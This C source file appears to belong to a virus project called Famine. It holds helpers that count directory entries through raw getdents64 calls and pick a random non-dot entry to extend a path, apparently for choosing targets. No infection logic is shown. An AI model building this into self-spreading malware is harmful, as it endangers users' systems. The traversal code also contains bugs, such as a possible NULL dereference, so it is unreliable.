#include <famine.h>

////////////////////////////////////////////////////////////////////////////////
/// STATIC FUNCTION
////////////////////////////////////////////////////////////////////////////////

static inline void update_to_absolute_path(char *path, const char *file)
{
	const size_t p_limit = _strlen(path);
	const size_t f_limit = _strlen(file);

	_bzero(path + p_limit, PATH_MAX - p_limit);

	for (size_t index = 0; index < f_limit; index++)
		path[p_limit + index] = file[index];
}

////////////////////////////////////////////////////////////////////////////////
/// PUBLIC FUNCTIONS
////////////////////////////////////////////////////////////////////////////////

int8_t update_entry(struct directory *dir)
{
	int fd = 0;
	size_t index = 0;
	size_t limit = 0;
	struct linux_dirent64 *dirp;
	char buf[BUFF_SIZE];

	if ((fd = _open(dir->path, O_RDONLY | O_DIRECTORY, 0000)) < 0)
		return FAILURE;

	while ((limit = _getdents64(fd, (struct linux_dirent64 *)buf, BUFF_SIZE)) > 0)
	{
		while (index < limit)
		{
			dirp = (struct linux_dirent64 *)(buf + index);
			index += dirp->d_reclen;
			dir->entry += 1;
		}
	}

	_close(fd);

	return SUCCESS;
}

int8_t update_path(struct directory *dir)
{
	int fd = 0;
	size_t index = 0;
	size_t limit = 0;
	size_t r_entry = 0;
	struct linux_dirent64 *dirp = NULL;
	char buf[BUFF_SIZE];

	if ((fd = _open(dir->path, O_RDONLY | O_DIRECTORY, 0000)) < 0)
		return FAILURE;

	r_entry = _get_random_integer(dir->entry);

	while ((limit = _getdents64(fd, (struct linux_dirent64 *)buf, BUFF_SIZE)) > 0)
	{
		while (index < limit)
		{
			dirp = (struct linux_dirent64 *)(buf + index);

			if (r_entry == 0)
				break ;

			index += dirp->d_reclen;
			r_entry -= 1;
		}
	}

	_close(fd);

	if (dirp->d_name[0] == '.')
		update_path(dir);
	else
		update_to_absolute_path(dir->path, dirp->d_name);

	return SUCCESS;
}
